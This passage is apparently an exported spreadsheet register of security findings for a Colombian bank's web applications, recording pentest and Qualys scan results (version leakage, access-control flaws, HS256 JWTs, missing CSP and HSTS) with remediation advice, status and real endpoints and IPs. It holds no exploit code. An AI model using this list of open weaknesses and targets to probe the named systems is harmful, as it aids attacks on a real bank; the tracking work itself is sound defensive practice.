mismo resultado es obtenido cuando se usa como “código” una dirección de correos no válida. El servidor en este caso devuelve un código 400 pero la versión del servidor web se exfiltra de igual manera.      Figura 36 - Uso de una dirección no válida, código de respuesta 400      Figura 37 - Versión de Apache Tomcat en la respuesta con código 400.   En los logs filtrados en el error es posible identificar que entre las tecnologías usadas se encuentran el framework springs.       SCBD-25-CNMPO-012-AP-005-002:   https://uat.invoway.com/action/verificarClaveCliente   Tras el login correcto el PIN es solicitado:      Figura 38 - Solicitud del PIN tras la autenticación basada en credenciales   Si el tráfico web es interceptado en caso de introducir números de PIN no válidos se genera un error en el servidor:      Figura 39 - Error generado a introducir un PIN no válido      Figura 40 - Versión de Apache Tomcat exfiltrada   SCBD-25-CNMPO-012-AP-005-003:   En la URL https://uat.invoway.com/cliente el servidor devuelve un error interno:      Figura 41 - Error devuelto en el propio navegador   SCBD-25-CGMPO-012-005-004:   En la URL https://uat.invoway.com/jkstatus aparece un error 404 donde se exfiltra la versión del servidor:      Figura 42 - Error devuelto por el servidor a internar acceder a un recurso específico       RIESGOS   Esta información es extremadamente valiosa para un atacante porque le permite:   - Identificar vulnerabilidades conocidas (CVEs) asociadas a versiones específicas   - Planificar ataques dirigidos basados en la tecnología utilizada   - Reducir significativamente el tiempo de reconocimiento   - Explotar debilidades específicas de componentes desactualizados"/>
    <s v="  RECOMENDACIÓN   Para mitigar esta vulnerabilidad es fundamental implementar un manejo robusto de errores que muestre únicamente mensajes genéricos al usuario final (como &quot;Ha ocurrido un error, intente nuevamente&quot;) sin revelar detalles técnicos. Todos los datos sensibles como versiones de software, trazas de pila, rutas de archivos y consultas SQL deben registrarse exclusivamente en logs internos con acceso restringido. Es esencial desactivar el modo debug en producción, configurar páginas de error personalizadas tanto en la aplicación como en el servidor web, y eliminar encabezados HTTP que expongan información del sistema (como &quot;X-Powered-By&quot; o versiones del servidor). Se recomienda centralizar el manejo de excepciones para garantizar un tratamiento uniforme y realizar auditorías periódicas que verifiquen que ningún mensaje de error filtre información aprovechable por atacantes."/>
    <m/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="545"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="LYNX"/>
    <s v="MAN-6989ec5d6d73db47900aceb1"/>
    <s v="SCBD-25-CNMPO-014-AP-001"/>
    <x v="219"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.4"/>
    <m/>
    <m/>
    <s v="181.57.221.233"/>
    <m/>
    <m/>
    <d v="2026-02-09T00:00:00"/>
    <n v="134"/>
    <d v="2026-05-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Es posible acceder o modificar contenido restringido o no autorizado al usuario. Permitiendo el _x000a_acceso o la modificación de información potencialmente sensible con diferentes niveles de _x000a_confidencialidad, dependiendo de la naturaleza de la información expuesta."/>
    <s v="Se recomienda introducir mecanismos de validación basado en accesos por usuario y/o roles para _x000a_acceder a cualquier tipo de funcionalidad de la aplicación. Además, se recomienda comprobar, _x000a_siempre en el lado del servidor, que el usuario que solicita el acceso dispone de privilegios de _x000a_acceso a la funcionalidad solicitada."/>
    <s v="Un usuario malintencionado puede acceder a funcionalidades a las que no debería tener acceso o _x000a_que no se encuentran directamente enlazadas en la aplicación."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jonathan Flores"/>
  </r>
  <r>
    <n v="546"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="LYNX"/>
    <s v="MAN-6989ee326d73db47900ad24f"/>
    <s v="SCBD-25-CNMPO-014-AP-002"/>
    <x v="5"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.4000000000000004"/>
    <m/>
    <m/>
    <s v="181.57.221.233"/>
    <m/>
    <m/>
    <d v="2026-02-09T00:00:00"/>
    <n v="134"/>
    <d v="2026-05-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha comprobado que las cabeceras HTTP de respuesta del _x000a_servidor revelan información interna acerca del tipo de servidor y versión del mismo a través de la _x000a_cabecera &quot;Server&quot; a través de la dirección URL https://181.57.221.233/lynx/api/v2"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al tipo de servidor _x000a_y versión utilizado para alojar la propia aplicación. Para ello es necesario eliminar las cabeceras de _x000a_respuesta HTTP, páginas por defecto y mensajes de error que divulguen este tipo de información."/>
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a _x000a_un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como _x000a_generar ataques más elaborados contra la plataforma."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jonathan Flores"/>
  </r>
  <r>
    <n v="547"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-1c220678-9a29-4386-b5b9-67996bd296e4"/>
    <m/>
    <x v="202"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/ApiContract/contract/1e2bb0fc-eebe-41d1-bff4-aff977a97516"/>
    <m/>
    <m/>
    <d v="2026-02-09T00:00:00"/>
    <n v="134"/>
    <d v="2026-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="During the WAS scan , it was observed that JWT token is used in Authorization header contains symmetric algorithm."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="548"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-b283bf25-ea1e-4c8c-988f-0bf81771f140"/>
    <m/>
    <x v="202"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/ApiContract/contract/b4a93885-fc9b-4282-a732-23b8f0a6f54f"/>
    <m/>
    <m/>
    <d v="2026-02-09T00:00:00"/>
    <n v="134"/>
    <d v="2026-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="During the WAS scan , it was observed that JWT token is used in Authorization header contains symmetric algorithm."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="549"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-0a8a69c4-fb03-43ea-81c9-c38ed758c0b0"/>
    <m/>
    <x v="220"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/ApiContract/rubros?codigoProducto=RI&amp;orderName=0"/>
    <m/>
    <m/>
    <d v="2026-02-09T00:00:00"/>
    <n v="134"/>
    <d v="2026-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="JWT token with symmetric algorithm was found in response header (Header Name is given in the reporting below). _x000a_Scan will look for JWT token using HS256 algorithm in response headers, especially in Cookie or any header value."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="550"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-12f4437f-0b2a-4d01-82bf-c6784f7dd3a0"/>
    <m/>
    <x v="220"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/ApiContract/contract/1e2bb0fc-eebe-41d1-bff4-aff977a97516"/>
    <m/>
    <m/>
    <d v="2026-02-09T00:00:00"/>
    <n v="134"/>
    <d v="2026-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="JWT token with symmetric algorithm was found in response header (Header Name is given in the reporting below). _x000a_Scan will look for JWT token using HS256 algorithm in response headers, especially in Cookie or any header value."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="551"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-6b4218dc-859a-4f96-b26c-ffc9ea6f4f97"/>
    <m/>
    <x v="220"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/apiri/configuracionGeneral/consultarConfiguraciones"/>
    <m/>
    <m/>
    <d v="2026-02-09T00:00:00"/>
    <n v="134"/>
    <d v="2026-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="JWT token with symmetric algorithm was found in response header (Header Name is given in the reporting below). _x000a_Scan will look for JWT token using HS256 algorithm in response headers, especially in Cookie or any header value."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="552"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-dbc8a6e0-8250-46af-864d-11171f4ab54b"/>
    <m/>
    <x v="220"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/ApiContract/contract/b4a93885-fc9b-4282-a732-23b8f0a6f54f"/>
    <m/>
    <m/>
    <d v="2026-02-09T00:00:00"/>
    <n v="134"/>
    <d v="2026-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="JWT token with symmetric algorithm was found in response header (Header Name is given in the reporting below). _x000a_Scan will look for JWT token using HS256 algorithm in response headers, especially in Cookie or any header value."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="553"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de Recaudos Empresariales"/>
    <s v="QA-WAS-de147cb4-3a04-4943-b816-2fcb103620a9"/>
    <m/>
    <x v="220"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <n v="7.3"/>
    <m/>
    <m/>
    <s v="https://portalpagos.santander.com.co/auth/apiDisclaimer/images/getIdByCategoria/1"/>
    <m/>
    <m/>
    <d v="2026-02-09T00:00:00"/>
    <n v="134"/>
    <d v="2026-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="JWT token with symmetric algorithm was found in response header (Header Name is given in the reporting below). _x000a_Scan will look for JWT token using HS256 algorithm in response headers, especially in Cookie or any header value."/>
    <m/>
    <s v="Review the JWT token set in Authorization header to use only one selected signature algorithm."/>
    <s v="sin definir"/>
    <m/>
    <s v="Juan David Cuesta"/>
  </r>
  <r>
    <n v="554"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Breb"/>
    <m/>
    <s v="SCBD-2025-CNMPO-013-AP-001"/>
    <x v="221"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="6.5"/>
    <m/>
    <m/>
    <s v="http://186.190.254.106:443/api/Consultar-DetalleCliente"/>
    <m/>
    <m/>
    <d v="2026-03-13T00:00:00"/>
    <n v="102"/>
    <d v="2026-06-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado una falta de medidas o controles para detectar y mitigar los intentos de automati_x0002_zación maliciosa en el activo. La automatización maliciosa se refiere al uso de herramientas automa_x0002_tizadas o scripts para llevar a cabo actividades fraudulentas, como el envío masivo de solicitudes o _x000a_ataques de fuerza bruta._x000a_La ausencia de dichos mecanismos ha permitido realizar una enumeración proporcionando distintos _x000a_identificadores."/>
    <s v="e recomienda implementar medidas para evitar que ningún mecanismo automático pueda reali_x0002_zar el proceso de autenticación en la aplicación, como por ejemplo un sistema reCAPTCHA, que _x000a_consiste en una prueba de desafío-respuesta utilizada en computación para determinar cuándo un _x000a_usuario es o no humano."/>
    <s v="La ausencia de un mecanismo anti-automatización puede tener los siguientes impactos negativos en _x000a_la seguridad:_x000a_Sin un mecanismo para detectar y bloquear los intentos de fuerza bruta, un atacante puede realizar _x000a_una gran cantidad de intentos de inicio de sesión o de adivinación de contraseñas sin restricciones. _x000a_Esto aumenta las posibilidades de que un atacante pueda acceder ilegalmente a cuentas de usuario _x000a_o a recursos protegidos._x000a_Los ataques automatizados pueden generar una alta carga en el sistema, consumiendo recursos _x000a_como ancho de banda, capacidad de procesamiento y memoria. Esto puede llevar a una degradación _x000a_del rendimiento y, en casos extremos, a la indisponibilidad del sistema para los usuarios legítimosz"/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="555"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Breb"/>
    <m/>
    <s v="SCBD-2025-CNMPO-013-CO-002"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="http://186.190.254.106:443/api/NotificarProcesoLlave"/>
    <m/>
    <m/>
    <d v="2026-03-13T00:00:00"/>
    <n v="102"/>
    <d v="2026-07-11T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cabecera &quot;CSP&quot; (Content Security Policy) permite al navegador del usuario controlar los recursos  JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la  carga de scripts en la página."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y _x000a_observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e _x000a_incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una _x000a_lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web. _x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security-Po_x0002_licy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata _x000a_de una versión antigua y no es necesario configurarla). "/>
    <s v="La ausencia de la cabecera &quot;Content Security Policy&quot; puede permitir a un atacante que localice una _x000a_vulnerabilidad de tipo &quot;Cross Site Scripting&quot; explotar la vulnerabilidad sin encontrarse ningún sis_x0002_tema de protección que mitigue su impacto. _x000a_El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies _x000a_y demás información sensible que un cliente pueda estar transmitiendo al sitio web."/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="556"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Breb"/>
    <m/>
    <s v="SCBD-2025-CNMPO-013-CO-003"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="http://186.190.254.106:443/api/ConsultarDetalleCliente"/>
    <m/>
    <m/>
    <d v="2026-03-13T00:00:00"/>
    <n v="102"/>
    <d v="2026-07-11T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cabecera &quot;CSP&quot; (Content Security Policy) permite al navegador del usuario controlar los recursos  JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la  carga de scripts en la página."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y _x000a_observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e _x000a_incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una _x000a_lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web. _x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security-Po_x0002_licy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata _x000a_de una versión antigua y no es necesario configurarla). "/>
    <s v="La ausencia de la cabecera &quot;Content Security Policy&quot; puede permitir a un atacante que localice una _x000a_vulnerabilidad de tipo &quot;Cross Site Scripting&quot; explotar la vulnerabilidad sin encontrarse ningún sis_x0002_tema de protección que mitigue su impacto. _x000a_El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies _x000a_y demás información sensible que un cliente pueda estar transmitiendo al sitio web."/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="557"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Breb"/>
    <m/>
    <s v="SCBD-2025-CNMPO-013-CO-004"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="http://186.190.254.106:443/api/ConfirmarAbono"/>
    <m/>
    <m/>
    <d v="2026-03-13T00:00:00"/>
    <n v="102"/>
    <d v="2026-07-11T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cabecera &quot;CSP&quot; (Content Security Policy) permite al navegador del usuario controlar los recursos  JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la  carga de scripts en la página."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y _x000a_observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e _x000a_incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una _x000a_lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web. _x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security-Po_x0002_licy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata _x000a_de una versión antigua y no es necesario configurarla). "/>
    <s v="La ausencia de la cabecera &quot;Content Security Policy&quot; puede permitir a un atacante que localice una _x000a_vulnerabilidad de tipo &quot;Cross Site Scripting&quot; explotar la vulnerabilidad sin encontrarse ningún sis_x0002_tema de protección que mitigue su impacto. _x000a_El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies _x000a_y demás información sensible que un cliente pueda estar transmitiendo al sitio web."/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="558"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Breb"/>
    <m/>
    <s v="SCBD-2025-CNMPO-013-CO-005"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="http://186.190.254.106:443/api/InstruccionAbono"/>
    <m/>
    <m/>
    <d v="2026-03-13T00:00:00"/>
    <n v="102"/>
    <d v="2026-07-11T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cabecera &quot;CSP&quot; (Content Security Policy) permite al navegador del usuario controlar los recursos  JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la  carga de scripts en la página."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y _x000a_observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e _x000a_incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una _x000a_lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web. _x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security-Po_x0002_licy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata _x000a_de una versión antigua y no es necesario configurarla). "/>
    <s v="La ausencia de la cabecera &quot;Content Security Policy&quot; puede permitir a un atacante que localice una _x000a_vulnerabilidad de tipo &quot;Cross Site Scripting&quot; explotar la vulnerabilidad sin encontrarse ningún sis_x0002_tema de protección que mitigue su impacto. _x000a_El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies _x000a_y demás información sensible que un cliente pueda estar transmitiendo al sitio web."/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="559"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Breb"/>
    <m/>
    <s v="SCBD-2025-CNMPO-013-CO-006"/>
    <x v="195"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="http://186.190.254.106:443/api/NotificarProcesoLlave"/>
    <m/>
    <m/>
    <d v="2026-03-13T00:00:00"/>
    <n v="102"/>
    <d v="2026-07-11T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante _x000a_la sesión. _x000a_El estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, em_x0002_pleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la informa_x0002_ción se envía a través de un canal seguro. _x000a_El protocolo incorpora una cabecera HTTP &quot;HSTS&quot; (HTTP Strict Transport Security) enviada desde el servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y  subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán almacena_x0002_das en el navegador durante un tiempo determinado que se establece en la propia cabecera de respuesta."/>
    <s v="En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor _x000a_web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web _x000a_y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y _x000a_servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas."/>
    <s v="Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta &quot;HSTS&quot; _x000a_en todas las respuestas del servidor. La sintaxis para ello es:_x000a_ Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains] _x000a_El parámetro &quot;max-age&quot; especifica el tiempo requerido para usar HTTPS y debería ser un número _x000a_alto, del orden de varios meses. La flag &quot;includeSubDomains&quot; define que la política aplica también a _x000a_los subdominios"/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="560"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Breb"/>
    <m/>
    <s v="SCBD-2025-CNMPO-013-CO-007"/>
    <x v="195"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="http://186.190.254.106:443/api/ConsultarDetalleCliente"/>
    <m/>
    <m/>
    <d v="2026-03-13T00:00:00"/>
    <n v="102"/>
    <d v="2026-07-11T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante _x000a_la sesión. _x000a_El estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, em_x0002_pleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la informa_x0002_ción se envía a través de un canal seguro. _x000a_El protocolo incorpora una cabecera HTTP &quot;HSTS&quot; (HTTP Strict Transport Security) enviada desde el servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y  subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán almacena_x0002_das en el navegador durante un tiempo determinado que se establece en la propia cabecera de respuesta."/>
    <s v="En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor _x000a_web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web _x000a_y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y _x000a_servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas."/>
    <s v="Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta &quot;HSTS&quot; _x000a_en todas las respuestas del servidor. La sintaxis para ello es:_x000a_ Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains] _x000a_El parámetro &quot;max-age&quot; especifica el tiempo requerido para usar HTTPS y debería ser un número _x000a_alto, del orden de varios meses. La flag &quot;includeSubDomains&quot; define que la política aplica también a _x000a_los subdominios"/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="561"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Breb"/>
    <m/>
    <s v="SCBD-2025-CNMPO-013-CO-008"/>
    <x v="195"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="http://186.190.254.106:443/api/ConfirmarAbono"/>
    <m/>
    <m/>
    <d v="2026-03-13T00:00:00"/>
    <n v="102"/>
    <d v="2026-07-11T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante _x000a_la sesión. _x000a_El estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, em_x0002_pleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la informa_x0002_ción se envía a través de un canal seguro. _x000a_El protocolo incorpora una cabecera HTTP &quot;HSTS&quot; (HTTP Strict Transport Security) enviada desde el servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y  subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán almacena_x0002_das en el navegador durante un tiempo determinado que se establece en la propia cabecera de respuesta."/>
    <s v="En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor _x000a_web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web _x000a_y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y _x000a_servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas."/>
    <s v="Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta &quot;HSTS&quot; _x000a_en todas las respuestas del servidor. La sintaxis para ello es:_x000a_ Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains] _x000a_El parámetro &quot;max-age&quot; especifica el tiempo requerido para usar HTTPS y debería ser un número _x000a_alto, del orden de varios meses. La flag &quot;includeSubDomains&quot; define que la política aplica también a _x000a_los subdominios"/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="562"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Breb"/>
    <m/>
    <s v="SCBD-2025-CNMPO-013-CO-009"/>
    <x v="195"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="http://186.190.254.106:443/api/InstruccionAbono"/>
    <m/>
    <m/>
    <d v="2026-03-13T00:00:00"/>
    <n v="102"/>
    <d v="2026-07-11T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales servidores web y la mayoría de los navegadores, que reduce las posibilidades de que un atacante pueda interceptar las comunicaciones y recopilar cookies y datos similares intercambiados durante _x000a_la sesión. _x000a_El estándar fuerza a que el servidor y el navegador web interactúen de manera más fiable, em_x0002_pleando el protocolo HTTPS en lugar de su variante insegura HTTP. De esta manera toda la informa_x0002_ción se envía a través de un canal seguro. _x000a_El protocolo incorpora una cabecera HTTP &quot;HSTS&quot; (HTTP Strict Transport Security) enviada desde el servidor al navegador del cliente, que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y  subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, 